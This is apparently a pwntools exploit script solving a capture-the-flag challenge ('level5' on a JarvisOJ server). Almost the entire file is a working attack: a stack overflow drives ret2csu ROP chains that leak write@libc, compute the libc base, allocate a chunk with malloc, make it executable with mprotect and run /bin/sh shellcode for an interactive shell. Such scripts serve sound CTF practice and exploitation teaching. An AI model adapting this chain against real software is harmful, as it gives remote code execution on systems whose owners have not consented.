#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
from pwn import *

context.log_level = 'debug'
context(arch='amd64', os='linux')


EXE = './level5'
ELF_CSU_INIT_POP = 0x4006AA
ELF_CSU_INIT_MOV = 0x400690
POP_RDI_RET = 0x004006b3  #: pop rdi ; ret  ;  (1 found)


BSS = 0x600a88

OFFSET = 0x80
PADDING = 'a' * (OFFSET + 8)

SHELLCODE = asm(shellcraft.sh())

class Local:
    LIBC = '/lib/x86_64-linux-gnu/libc.so.6'
    HOST = '127.0.0.1'
    PORT = 4444
    MOV_pRDI_RAX_RET = 0x0007b136  #: mov qword [rdi+0x08], rax ; ret  ;  (1 found)
    MOV_pRDI_RAX_RET_OFFSET = 0x08
    POP_RSI_RET = 0x000202e8  #: pop rsi ; ret  ;  (1 found)
    POP_RDX_RET = 0x00001b92  #: pop rdx ; ret  ;  (1 found)

class Remote:
    LIBC = './libc-2.19.so'
    HOST = 'pwn2.jarvisoj.com'
    PORT = 9884
    MOV_pRDI_RAX_RET = 0x0007b036  #: mov qword [rdi+0x08], rax ; ret  ;  (1 found)
    MOV_pRDI_RAX_RET_OFFSET = 0x08
    POP_RSI_RET = 0x00024885  #: pop rsi ; ret  ;  (1 found)
    POP_RDX_RET = 0x00001b8e  #: pop rdx ; ret  ;  (1 found)

def main():
    if len(sys.argv) > 1 and sys.argv[1] == 'remote':
        env = Remote
    else:
        env = Local
    exe = ELF(EXE)
    libc = ELF(env.LIBC)
    io = remote(env.HOST, env.PORT)


    log.info('call [write] to get write@libc address ...')
    # 获取 write@libc 地址
    p = PADDING
    p += p64(ELF_CSU_INIT_POP)  # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15; ret ;
    p += p64(0)  # rbx
    p += p64(1)  # rbp
    p += p64(exe.got['write'])  # r12
    p += p64(8)  # r13 -> rdx
    p += p64(exe.got['write'])  # r14 -> rsi
    p += p64(1)  # r15 -> edi
    p += p64(ELF_CSU_INIT_MOV)  # mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call qword [r12+rbx*8];
    p += 7 * 8 * 'a'
    # 将malloc返回需要用的地址写入bss
    p += p64(ELF_CSU_INIT_POP)  # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15; ret ;
    p += p64(0)  # rbx
    p += p64(1)  # rbp
    p += p64(exe.got['read'])  # r12
    p += p64(8)  # r13 -> rdx
    p += p64(BSS + env.MOV_pRDI_RAX_RET_OFFSET)  # r14 -> rsi
    p += p64(0)  # r15 -> edi
    p += p64(ELF_CSU_INIT_MOV)  # mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call qword [r12+rbx*8];
    p += 7 * 8 * 'a'
    p += p64(exe.symbols['_start'])

    log.info('payload({})={}'.format(len(p), repr(p)))

    # raw_input('wait debug')
    io.sendafter(':\n', p)

    out = io.recv(8)
    io.send(p64(BSS))

    write_addr = u64(out[:8])
    log.success('write_addr = ' + hex(write_addr))
    libc_base = write_addr - libc.symbols['write']
    log.success('libc_base = ' + hex(libc_base))
    mmap_addr = libc_base + libc.symbols['mmap']
    log.success('mmap_addr = ' + hex(mmap_addr))
    read_addr = libc_base + libc.symbols['read']
    log.success('read_addr = ' + hex(read_addr))
    malloc_addr = libc_base + libc.symbols['malloc']
    log.success('malloc_addr = ' + hex(malloc_addr))
    mprotect_addr = libc_base + libc.symbols['mprotect']
    log.success('mprotect_addr = ' + hex(mprotect_addr))

    print 'malloc ret : b *{}'.format(hex(malloc_addr + 188))


    # raw_input('wait debug')

    log.info('call [malloc] to get memory chunk ...')

    p = PADDING
    p += p64(POP_RDI_RET) + p64(128)  # malloc(128)
    p += p64(malloc_addr)
    p += p64(POP_RDI_RET) + p64(BSS)
    p += p64(libc_base + env.MOV_pRDI_RAX_RET)  # mov malloc return address(rax) to BSS

    p += p64(ELF_CSU_INIT_POP)  # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15; ret ;
    p += p64(0)  # rbx
    p += p64(1)  # rbp
    p += p64(exe.got['write'])  # r12
    p += p64(8)  # r13 -> rdx
    p += p64(BSS + env.MOV_pRDI_RAX_RET_OFFSET)  # r14 -> rsi
    p += p64(1)  # r15 -> edi
    p += p64(ELF_CSU_INIT_MOV)  # mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call qword [r12+rbx*8];
    p += 7 * 8 * 'a'

    p += p64(exe.symbols['vulnerable_function'])

    
    io.sendafter(':\n', p)
    out = io.recv(8)
    print repr(out)

    mem_addr = u64(out)
    print hex(mem_addr)
    # raw_input('wait debug')

    p = PADDING

    p += p64(ELF_CSU_INIT_POP)  # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15; ret ;
    p += p64(0)  # rbx
    p += p64(1)  # rbp
    p += p64(exe.got['read'])  # r12
    p += p64(len(SHELLCODE))  # r13 -> rdx
    p += p64(mem_addr)  # r14 -> rsi
    p += p64(1)  # r15 -> edi
    p += p64(ELF_CSU_INIT_MOV)  # mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call qword [r12+rbx*8];
    p += 7 * 8 * 'a'

    p += p64(POP_RDI_RET) + p64(mem_addr - 0x10)
    p += p64(libc_base + env.POP_RSI_RET) + p64(1024)
    p += p64(libc_base + env.POP_RDX_RET) + p64(7)
    p += p64(mprotect_addr)

    p += p64(mem_addr)

    io.sendafter(':\n', p)

    raw_input('wait debug')

    sleep(0.1)

    io.send(SHELLCODE)

    

    io.interactive()

    io.close()

main()